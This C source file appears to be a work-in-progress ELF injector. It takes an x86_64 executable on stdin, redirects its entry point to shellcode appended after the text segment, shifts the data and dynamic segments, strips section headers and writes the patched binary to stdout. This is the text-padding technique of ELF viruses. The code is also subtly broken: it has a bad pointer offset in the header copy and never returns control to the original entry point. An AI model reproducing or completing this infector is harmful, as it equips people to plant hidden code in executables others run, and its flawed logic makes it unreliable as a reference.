#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/stat.h>
// TODO: handle x86_32 and x86_64
// This will currently work only on x86_64 and only if you are running x86_64
// TODO: deal with endianness
#include "include/ansidecl.h"
#include "include/elf/common.h"
#include "include/elf/external.h"

// TODO: move forward by the necessary number of pages, not just one
// TODO: perserve the sections
// TODO: don't make so many assumptions about what segments other than the text segment exist

static long long page_size = 0x1000;
static unsigned shell_size;
static unsigned char *shell;

static unsigned get_file_size(const char *file_name) {
  struct stat sb;
  if (stat(file_name, & sb) != 0) {
    return -1;
  }
  return sb.st_size;
}

static unsigned char *read_whole_file(const char *file_name, unsigned s) {
  unsigned char *contents;
  FILE *f;
  size_t bytes_read;
  int status;

  contents = malloc(s + 1); // XXX: why + 1 ?
  if (!contents) {
    return 0;
  }

  f = fopen(file_name, "r");
  if (! f) {
    return 0;
  }
  bytes_read = fread(contents, sizeof(unsigned char), s, f);
  if (bytes_read != s) {
    return 0;
  }
  status = fclose(f);
  if (status != 0) {
    return 0;
  }
  return contents;
}

#define max(a,b) \
   ({ __typeof__ (a) _a = (a); \
       __typeof__ (b) _b = (b); \
     _a > _b ? _a : _b; })

#define min(a,b) \
   ({ __typeof__ (a) _a = (a); \
       __typeof__ (b) _b = (b); \
     _a < _b ? _a : _b; })

typedef struct {
  Elf64_External_Ehdr ehdr;
  Elf64_External_Phdr *phdr;
  int read_bytes;
  long long phdr_offset;
  short phdr_num;
  long long text_end;
  long long data_end;
  long long alignment_padding;
} processing_state;

// returns the number of bytes consumed, 0 on end of stream and negative on error
// call with a buffer pointer and length
int handle_bytes(processing_state *ps, unsigned char *buff, int len, int out_fd) {
  int consumed_bytes = 0;

  int phdr_end = ps->phdr_offset + ps->phdr_num * sizeof(Elf64_External_Phdr);
  // we haven't finished reading the header, so we read more of the header
  if (ps->read_bytes < sizeof(ps->ehdr)) {
    fprintf(stderr, "...");

    // we have more bytes than the header, we should consume only as much as the header and let the next case handle the next part
    consumed_bytes = min(len, sizeof(ps->ehdr) - ps->read_bytes);
    memcpy(&ps->ehdr + ps->read_bytes, buff, consumed_bytes);

    // header end condition
    if (ps->read_bytes + consumed_bytes == sizeof(ps->ehdr)) {
      // 1. (optional) extract the location of phdr
      memcpy(&ps->phdr_offset, ps->ehdr.e_phoff, sizeof(ps->ehdr.e_phoff));

      // 2. extract the size of phdr
      memcpy(&ps->phdr_num, ps->ehdr.e_phnum, sizeof(ps->ehdr.e_phnum));

      // 3. get rid of sections
      memset(&ps->ehdr.e_shoff, 0, sizeof(ps->ehdr.e_shoff));
      memset(&ps->ehdr.e_shentsize, 0, sizeof(ps->ehdr.e_shentsize));
      memset(&ps->ehdr.e_shnum, 0, sizeof(ps->ehdr.e_shnum));
      memset(&ps->ehdr.e_shstrndx, 0, sizeof(ps->ehdr.e_shstrndx));

      // 4. allocate a phdr array
      ps->phdr = malloc(ps->phdr_num * sizeof(Elf64_External_Phdr));

    }
  }
  // we haven't finished reading phdr, so we read more of phdr
  else if (ps->read_bytes < phdr_end) {
    printf("---");

    // figure out which phdr we are on
    int current_phdr = (ps->read_bytes - sizeof(ps->ehdr)) / sizeof(Elf64_External_Phdr);

    // figure out how far into the current phdr we've read
    int bytes_read_already = ps->read_bytes - sizeof(ps->ehdr) - current_phdr * sizeof(Elf64_External_Phdr);

    // how much can we consume?
    consumed_bytes = min(len, sizeof(Elf64_External_Phdr) - bytes_read_already);
    memcpy(&ps->phdr[current_phdr], buff, consumed_bytes);

    printf("current_phdr: %d\n", current_phdr);

    // we have read a full phdr
    if (bytes_read_already + consumed_bytes == sizeof(Elf64_External_Phdr)) {

      // is this the last one?
      if (current_phdr == ps->phdr_num - 1) {
        fprintf(stderr, "done\n");
        // 1. find the text and data segments

        int text_seg = -1;
        int data_seg = -1;
        int dynamic_seg = -1;
        int i;
        for (i = 0; i < ps->phdr_num; i++) {
          // text segment is of type LOAD and is executable
          unsigned int p_type, p_flags;
          memcpy(&p_type, ps->phdr[i].p_type, sizeof(ps->phdr[i].p_type));
          memcpy(&p_flags, ps->phdr[i].p_flags, sizeof(ps->phdr[i].p_flags));
          if (text_seg == -1 && p_type == PT_LOAD && (p_flags & PF_X) != 0) {
            text_seg = i;
          } else {
            // data segment is of type LOAD and is after the text segment
            if (p_type == PT_LOAD) {
              data_seg = i;
            } else if (p_type == PT_DYNAMIC) {
              dynamic_seg = i;
            }
          }
        }
        if (text_seg == -1) {
          return -1;
        }
        if (data_seg == -1) {
          return -2;
        }
        if (dynamic_seg == -1) {
          return -3;
        }

        // 2. change the entry point in the header to be after the end of the text segment
        // XXX: assume filesz == memsz
        long long text_off, text_filesz, text_vaddr;
        memcpy(&text_off, &ps->phdr[text_seg].p_offset, sizeof(ps->phdr[text_seg].p_offset));
        memcpy(&text_filesz, &ps->phdr[text_seg].p_filesz, sizeof(ps->phdr[text_seg].p_filesz));
        memcpy(&text_vaddr, &ps->phdr[text_seg].p_vaddr, sizeof(ps->phdr[text_seg].p_vaddr));
        long long entry_point = text_vaddr + text_filesz;
        memcpy(&ps->ehdr.e_entry, &entry_point, sizeof(ps->ehdr.e_entry));

        // 3. extend the text segment by the size of the shell
        long long text_newsz = text_filesz + shell_size;
        memcpy(&ps->phdr[text_seg].p_filesz, &text_newsz, sizeof(ps->phdr[text_seg].p_filesz));
        memcpy(&ps->phdr[text_seg].p_memsz, &text_newsz, sizeof(ps->phdr[text_seg].p_memsz));

        // 4. move the data segment forward by a page only on disk
        // XXX: assume filesz == memsz
        long long data_off, data_new_off;
        memcpy(&data_off, &ps->phdr[data_seg].p_offset, sizeof(ps->phdr[data_seg].p_offset));
        data_new_off = data_off + page_size;
        memcpy(&ps->phdr[data_seg].p_offset, &data_new_off, sizeof(ps->phdr[data_seg].p_offset));

        // 5. move the dynamic segment forward by a page only on disk
        // XXX: assume filesz == memsz
        long long dynamic_off, dynamic_new_off;
        memcpy(&dynamic_off, &ps->phdr[dynamic_seg].p_offset, sizeof(ps->phdr[dynamic_seg].p_offset));
        dynamic_new_off = dynamic_off + page_size;
        memcpy(&ps->phdr[dynamic_seg].p_offset, &dynamic_new_off, sizeof(ps->phdr[dynamic_seg].p_offset));

        // 6. remember where each section ends so that we can send the right amount of data
        long long data_filesz;
        memcpy(&data_filesz, &ps->phdr[data_seg].p_filesz, sizeof(ps->phdr[data_seg].p_filesz));

        ps->text_end = text_off + text_filesz;
        ps->data_end = data_off + data_filesz;
        // XXX: we don't we need this?
        ps->alignment_padding = 0;//data_off - text_off + text_filesz;
        fprintf(stderr, "%d\n", text_off);
        fprintf(stderr, "%d\n", data_off);
        fprintf(stderr, "%d\n", ps->alignment_padding);
        fprintf(stderr, "%d\n", ps->text_end);
        fprintf(stderr, "%d\n", ps->data_end);

        // 7. start sending the ehdr and phdr
        fprintf(stderr, "start sending...\n");
        // TODO: retry writes if we have to / error checking
        write(out_fd, &ps->ehdr, sizeof(ps->ehdr));
        for (i = 0; i < ps->phdr_num; i++) {
          write(out_fd, &ps->phdr[i], sizeof(ps->phdr[i]));
        }
      }
    }
  } else {
    // every time we receive bytes before the end of the text segment, just pass them through
    if (ps->read_bytes < ps->text_end) {
      consumed_bytes = min(len, ps->text_end - ps->read_bytes);
      // TODO: retry writes if we have to / error checking
      write(out_fd, buff, consumed_bytes);

      // when we get to the end, dump in the shell and then the padding after it
      if (ps->read_bytes + consumed_bytes == ps->text_end) {
        write(out_fd, shell, shell_size);
        int i;
        char null[] = "\0";
        // padding for page size left over and for the original space that existed between the data and text sections on disk
        for (i = 0; i < page_size - shell_size + ps->alignment_padding; i++) {
          write(out_fd, null, 1);
        }
      }
    } else if (ps->read_bytes < ps->data_end) {
    fprintf(stderr, "+++\n");
      consumed_bytes = min(len, ps->data_end - ps->read_bytes);
      // TODO: retry writes if we have to / error checking
      write(out_fd, buff, consumed_bytes);
    } else {
      // we are done!
      free(ps->phdr);
      consumed_bytes = 0;
    }
  }

done:
  ps->read_bytes += consumed_bytes;
  return consumed_bytes;
}

int process(int in_fd, int out_fd) {
  processing_state ps;
  memset(&ps, 0, sizeof(ps));

  unsigned char in_buff[BUFSIZ];
  int in_buff_len;

  while ((in_buff_len = read(in_fd, in_buff, BUFSIZ)) != 0) {
    int offset = 0;
    while (offset < in_buff_len) {
      fprintf(stderr, "len going in: %d\n", in_buff_len - offset);
      int consumed = handle_bytes(&ps, in_buff + offset, in_buff_len - offset, out_fd);
      fprintf(stderr, "consumed: %d\n", consumed);
      if (consumed <= 0) {
        return consumed;
      }
      offset += consumed;
    }
    fprintf(stderr, "offset: %d\n", offset);
  }
  fprintf(stderr, "exit: %d\n", in_buff_len);
  return in_buff_len;
}

int main(int argc, char* argv[]) {
  //XXX: a bit of a race condition here, TOCTOU, etc. but such is the way of the lazy; we check the size later again, I guess...
  static unsigned char file_name[] = "./stubs/stub_exit_43";
  shell_size = get_file_size(file_name);
  shell = read_whole_file(file_name, shell_size);
  int ret = process(STDIN_FILENO, STDOUT_FILENO);
  free(shell);
  return ret;
}
